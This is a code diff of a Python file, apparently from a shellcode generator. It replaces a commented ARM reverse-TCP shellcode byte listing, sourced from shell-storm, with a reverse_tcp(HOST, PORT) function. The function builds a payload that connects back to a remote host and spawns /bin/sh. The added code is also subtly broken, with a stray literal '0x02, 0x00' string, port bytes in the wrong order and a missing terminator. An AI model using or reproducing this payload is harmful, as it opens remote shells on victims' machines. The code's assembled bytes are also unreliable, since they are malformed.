@@ -1,36 +1,26 @@
 #http://shell-storm.org/shellcode/files/shellcode-821.php
-#Must be fix ..
 
 
-def reverse_tcp():
-    ret
-    """
-    	0x01, 0x10, 0x8F, 0xE2,
-    	0x11, 0xFF, 0x2F, 0xE1,
 
-    	0x02, 0x20, 0x01, 0x21,
-    	0x92, 0x1a, 0x0f, 0x02,
-    	0x19, 0x37, 0x01, 0xdf,
-    	0x06, 0x1c, 0x08, 0xa1,
-    	0x10, 0x22, 0x02, 0x37,
-    	0x01, 0xdf, 0x3f, 0x27,
-    	0x02, 0x21,
-
-    	0x30, 0x1c, 0x01, 0xdf,
-    	0x01, 0x39, 0xfb, 0xd5,
-    	0x05, 0xa0, 0x92, 0x1a,
-    	0x05, 0xb4, 0x69, 0x46,
-    	0x0b, 0x27,0x01, 0xdf,
-    	0xc0, 0x46,
-
-    	/* struct sockaddr */
-    	0x02, 0x00,
-    	/* port: 0x1234 */
-    	0x13, 0x37,
-    	/* ip: 10.1.1.2 */
-    	0x0A, 0x01, 0x01, 0x02,
-
-    	/* "/bin/sh\0" */
-    	0x2f, 0x62, 0x69, 0x6e,0x2f, 0x73, 0x68, 0x00
-
-    """
+def reverse_tcp( HOST,PORT):
+    shellcode =  r"\x01\x10\x8F\xE2"
+    shellcode += r"\x11\xFF\x2F\xE1"
+    shellcode += r"\x02\x20\x01\x21"
+    shellcode += r"\x92\x1a\x0f\x02"
+    shellcode += r"\x19\x37\x01\xdf"
+    shellcode += r"\x06\x1c\x08\xa1"
+    shellcode += r"\x10\x22\x02\x37"
+    shellcode += r"\x01\xdf\x3f\x27"
+    shellcode += r"\x02\x21"
+    shellcode += r"\x30\x1c\x01\xdf"
+    shellcode += r"\x01\x39\xfb\xd5"
+    shellcode += r"\x05\xa0\x92\x1a"
+    shellcode += r"\x05\xb4\x69\x46"
+    shellcode += r"\x0b\x27\x01\xdf"
+    shellcode += r"\xc0\x46"
+    shellcode += r"0x02, 0x00"
+    shellcode += PORT
+    shellcode += r"\x13\x37"
+    shellcode += HOST
+    shellcode += r"\x2f\x62\x69\x6e\x2f\x73\x68"  
+    return shellcode
